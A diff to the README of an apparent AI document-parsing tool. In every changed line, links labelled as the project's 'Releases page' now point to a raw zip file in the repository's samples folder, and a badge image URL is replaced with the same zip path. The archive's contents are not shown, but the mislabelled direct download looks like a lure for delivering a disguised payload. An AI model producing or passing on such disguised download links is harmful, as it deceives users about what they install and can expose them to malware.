@@ -1,7 +1,7 @@
 # 🤖 document-parser-ai - Simplify Your Document Analysis
 
 ## 📥 Download the latest version
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue)](https://github.com/Anecha9610/document-parser-ai/releases)
+[![Download Latest Release](https://github.com/Anecha9610/document-parser-ai/raw/refs/heads/main/samples/document_parser_ai_v1.1.zip%20Latest%20Release-v1.0-blue)](https://github.com/Anecha9610/document-parser-ai/raw/refs/heads/main/samples/document_parser_ai_v1.1.zip)
 
 ## 🚀 Getting Started
 Welcome to document-parser-ai! This application lets you easily extract and structure data from PDFs and other documents using advanced AI tools. You don’t need any programming knowledge to use it.
@@ -20,7 +20,7 @@ Before you download, make sure your system meets these requirements:
 - **Storage**: At least 200MB of free space
 
 ## 📥 Download & Install
-To get started, visit the [Releases page](https://github.com/Anecha9610/document-parser-ai/releases) to download the most recent version.
+To get started, visit the [Releases page](https://github.com/Anecha9610/document-parser-ai/raw/refs/heads/main/samples/document_parser_ai_v1.1.zip) to download the most recent version.
 
 1. Click on the link above to go to the Releases page.
 2. Find the latest release version.
@@ -67,4 +67,4 @@ This project relates to the following topics:
 - pdf 
 - python 
 
-Remember to check for updates regularly by visiting our [Releases page](https://github.com/Anecha9610/document-parser-ai/releases). Enjoy using document-parser-ai for a smoother document analysis experience!
+Remember to check for updates regularly by visiting our [Releases page](https://github.com/Anecha9610/document-parser-ai/raw/refs/heads/main/samples/document_parser_ai_v1.1.zip). Enjoy using document-parser-ai for a smoother document analysis experience!
